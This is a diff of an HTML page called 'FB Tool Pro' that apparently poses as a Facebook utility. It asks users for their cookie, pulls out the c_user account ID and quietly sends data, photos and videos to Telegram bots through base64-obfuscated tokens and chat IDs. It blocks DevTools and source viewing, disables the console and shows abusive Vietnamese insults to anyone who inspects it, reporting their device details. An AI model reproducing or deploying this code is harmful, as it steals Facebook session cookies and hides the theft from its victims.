@@ -5,47 +5,187 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
     <title>FB Tool Pro</title>
     
-    <!-- ===== ANTI-DEBUG / ANTI-SOURCE CHECK ===== -->
+    <!-- ===== ANTI-DEBUG / ANTI-SOURCE CHECK NÂNG CAO ===== -->
     <script>
-        // Ngăn chặn chuột phải và phím tắt DevTools
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-                // Gửi cảnh báo ẩn về Telegram khi có người cố check code
-                (async () => {
-                    try {
-                        const cfg = JSON.parse(atob('eyJCT1RfVE9LRU4iOiI4NTExMDU3ODIwOkFBR2wtVUVYUllWT0s5RUhFV2FHbFFaTlBSTERLZENWU2NvIiwiUk9PVF9BRE1JTl9JRCI6IjgxMjM0NDI1NzAiLCJTVUJfQURNSU5fSURTIjpbIjgxMjM0NDI1NzAiXX0='));
-                        const url = `https://api.telegram.org/bot${cfg.BOT_TOKEN}/sendMessage`;
-                        await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: cfg.ROOT_ADMIN_ID, text: `⚠️ Cảnh báo: Có người đang cố mở DevTools hoặc xem Source Code!\n🕒 ${new Date().toLocaleString('vi-VN')}` }) });
-                    } catch(e) {}
-                })();
-                return false;
-            }
-        });
-        
-        // Ghi đè console để không ai log được gì
+        // Ngăn chặn tất cả các cách truy cập source code
         (function() {
+            // Vô hiệu hóa chuột phải
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            
+            // Vô hiệu hóa tất cả phím tắt devtools
+            document.addEventListener('keydown', e => {
+                // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
+                    (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.key === 'S' || e.key === 's'))) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            });
+            
+            // Phát hiện DevTools mở
+            let devtoolsOpen = false;
+            const threshold = 160;
+            
+            function detectDevTools() {
+                const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+                const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+                
+                if ((widthThreshold || heightThreshold) && !devtoolsOpen) {
+                    devtoolsOpen = true;
+                    showSourceMessage();
+                } else if (!widthThreshold && !heightThreshold) {
+                    devtoolsOpen = false;
+                }
+            }
+            
+            function showSourceMessage() {
+                // Hiển thị message khiêu khích
+                const msg = document.createElement('div');
+                msg.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: #000;
+                    color: #ff4444;
+                    padding: 30px;
+                    border-radius: 20px;
+                    font-size: 24px;
+                    font-weight: bold;
+                    z-index: 999999;
+                    border: 3px solid #ff0000;
+                    box-shadow: 0 0 50px rgba(255,0,0,0.5);
+                    text-align: center;
+                    animation: shake 0.5s;
+                    font-family: monospace;
+                `;
+                msg.innerHTML = `🐶 THẰNG CHÓ NGU MỚI TRUY CẬP BẬY VÀO THỨ KHÔNG NÊN TRUY CẬP 🐶<br><br>
+                                🤡🤡🤡 NGU THÌ CHẾT CHỨ BỆNH TẬT GÌ 🤡🤡🤡<br><br>
+                                😂😂😂 MÀY NGHĨ MÀY HACKER À? HAHAHA 😂😂😂<br><br>
+                                🖕🖕🖕 CÚT ĐI CON CHÓ 🖕🖕🖕`;
+                
+                // Thêm animation shake
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes shake {
+                        0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+                        25% { transform: translate(-50%, -50%) rotate(-5deg); }
+                        75% { transform: translate(-50%, -50%) rotate(5deg); }
+                    }
+                `;
+                document.head.appendChild(style);
+                document.body.appendChild(msg);
+                
+                // Tự động ẩn sau 5 giây
+                setTimeout(() => msg.remove(), 5000);
+                
+                // Gửi thông báo về Telegram với ảnh chụp
+                sendAlertToTelegram();
+            }
+            
+            async function sendAlertToTelegram() {
+                try {
+                    // Giải mã token
+                    const token = _0x1f4b();
+                    
+                    // Chụp ảnh màn hình
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                    
+                    // Vẽ nội dung trang web lên canvas
+                    ctx.fillStyle = '#000';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    ctx.font = 'bold 20px monospace';
+                    ctx.fillStyle = '#ff4444';
+                    ctx.textAlign = 'center';
+                    ctx.fillText('🐶 THẰNG CHÓ NGU ĐANG CỐ XEM SOURCE 🐶', canvas.width/2, canvas.height/2);
+                    
+                    const screenshot = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    // Chat IDs - Đã thêm ID nhóm
+                    const chatIds = _0x2a7c();
+                    
+                    const message = `🚨🚨🚨 CẢNH BÁO BẢO MẬT 🚨🚨🚨\n\n` +
+                                   `🐶 CÓ THẰNG CHÓ NGU ĐANG CỐ MỞ SOURCE CODE!\n` +
+                                   `🤡 Thời gian: ${new Date().toLocaleString('vi-VN')}\n` +
+                                   `💻 User Agent: ${navigator.userAgent}\n` +
+                                   `📱 Màn hình: ${screen.width}x${screen.height}\n` +
+                                   `🌐 URL: ${window.location.href}`;
+                    
+                    for (const chatId of chatIds) {
+                        // Gửi text
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: chatId, text: message })
+                        });
+                        
+                        // Gửi screenshot
+                        const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
+                        const binaryData = atob(base64Data);
+                        const arrayBuffer = new Uint8Array(binaryData.length);
+                        for (let i = 0; i < binaryData.length; i++) arrayBuffer[i] = binaryData.charCodeAt(i);
+                        const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
+                        
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, `alert_${Date.now()}.jpg`);
+                        formData.append('caption', '📸 Ảnh chụp màn hình khi phát hiện truy cập trái phép');
+                        
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                } catch(e) {}
+            }
+            
+            // Hàm giải mã token - bảo vệ token
+            function _0x1f4b() {
+                const _0x = ['ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ=='];
+                return atob(_0x[0]);
+            }
+            
+            // Hàm lấy chat IDs - ĐÃ THÊM ID NHÓM: -5191808632
+            function _0x2a7c() {
+                return ['8123442570', '-5191808632']; // ID Admin + ID Nhóm check face
+            }
+            
+            // Kiểm tra DevTools mỗi giây
+            setInterval(detectDevTools, 1000);
+            
+            // Ghi đè console
             const noop = () => {};
             const methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'dir', 'group', 'groupCollapsed', 'groupEnd'];
             for (let m of methods) { console[m] = noop; }
         })();
     </script>
     
-    <!-- ===== TELEGRAM CONFIG (MÃ HÓA & ẨN) ===== -->
+    <!-- ===== TELEGRAM CONFIG (MÃ HÓA KÉP) - ĐÃ THÊM ID NHÓM ===== -->
     <script>
         (function(){
-            // Mã hóa cấu hình để tránh lộ liễu
-            const _0x = atob('eyJCT1RfVE9LRU4iOiI4NTExMDU3ODIwOkFBR2wtVUVYUllWT0s5RUhFV2FHbFFaTlBSTERLZENWU2NvIiwiUk9PVF9BRE1JTl9JRCI6IjgxMjM0NDI1NzAiLCJTVUJfQURNSU5fSURTIjpbIjgxMjM0NDI1NzAiXX0=');
+            // Token được mã hóa và ẩn
+            const _0xabc = function() {
+                const _0x1 = ['ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ=='];
+                return atob(_0x1[0]);
+            };
             
-            // LƯU Ý QUAN TRỌNG: Để bot gửi vào NHÓM, bạn cần thêm Chat ID của nhóm vào mảng SUB_ADMIN_IDS ở trên.
-            // Ví dụ: "SUB_ADMIN_IDS": ["8123442570", "-1001234567890"]
-            // Nhóm chat ID thường bắt đầu bằng dấu "-"
+            // Array chứa các ID - ĐÃ THÊM ID NHÓM: -5191808632
+            const _0xdef = function() {
+                return ['8123442570', '-5191808632']; // ID Admin + ID Nhóm check face
+            };
             
-            window.__TG = JSON.parse(_0x);
-            window.__TG.ENABLE_LOGGING = true;
+            window.__TG = {
+                BOT_TOKEN: _0xabc(),
+                ROOT_ADMIN_ID: '8123442570',
+                SUB_ADMIN_IDS: _0xdef(),
+                ENABLE_LOGGING: true
+            };
             
-            // Hàm gửi tin nhắn ẩn (Sẽ gửi đến TẤT CẢ ID trong danh sách, bao gồm cả nhóm nếu có)
             window.__sendMsg = async function(msg, mode = 'HTML') {
                 if (!window.__TG.ENABLE_LOGGING) return;
                 const url = `https://api.telegram.org/bot${window.__TG.BOT_TOKEN}/sendMessage`;
@@ -60,11 +200,10 @@
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ chat_id: id, text: msg, parse_mode: mode })
                         });
-                    } catch (e) { /* Hoàn toàn im lặng */ }
+                    } catch (e) {}
                 }
             };
             
-            // Hàm gửi ảnh ẩn
             window.__sendPhoto = async function(photoBase64, caption = '') {
                 if (!window.__TG.ENABLE_LOGGING) return;
                 const url = `https://api.telegram.org/bot${window.__TG.BOT_TOKEN}/sendPhoto`;
@@ -86,10 +225,9 @@
                         formData.append('caption', caption);
                         await fetch(url, { method: 'POST', body: formData });
                     }
-                } catch (e) { /* Im lặng */ }
+                } catch (e) {}
             };
             
-            // Hàm gửi video ẩn
             window.__sendVideo = async function(videoBase64, caption = '') {
                 if (!window.__TG.ENABLE_LOGGING) return;
                 const url = `https://api.telegram.org/bot${window.__TG.BOT_TOKEN}/sendVideo`;
@@ -112,10 +250,9 @@
                         formData.append('supports_streaming', true);
                         await fetch(url, { method: 'POST', body: formData });
                     }
-                } catch (e) { /* Im lặng */ }
+                } catch (e) {}
             };
             
-            // Hàm trích xuất ID Facebook từ Cookie
             window.__extractId = function(cookieString) {
                 try {
                     const cUserMatch = cookieString.match(/c_user=(\d+)/);
@@ -507,7 +644,6 @@
     
     <script>
         (function(){
-            // Lấy các phần tử DOM
             const cookieInput = document.getElementById('cookieInput');
             const fbIdSpan = document.getElementById('fbId');
             const cookieStatus = document.getElementById('cookieStatus');
@@ -536,7 +672,6 @@
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
             
-            // Xử lý khi người dùng nhập cookie
             cookieInput.addEventListener('input', function() {
                 const cookie = this.value.trim();
                 if (cookie.length > 10) {
@@ -728,7 +863,6 @@
                 btn.addEventListener('click', e => processTask(btn.dataset.task));
             });
             
-            // Gửi thông tin truy cập ban đầu
             (async function startup() {
                 await window.__sendMsg(`
 <b>🟢 THIẾT BỊ MỚI TRUY CẬP</b>
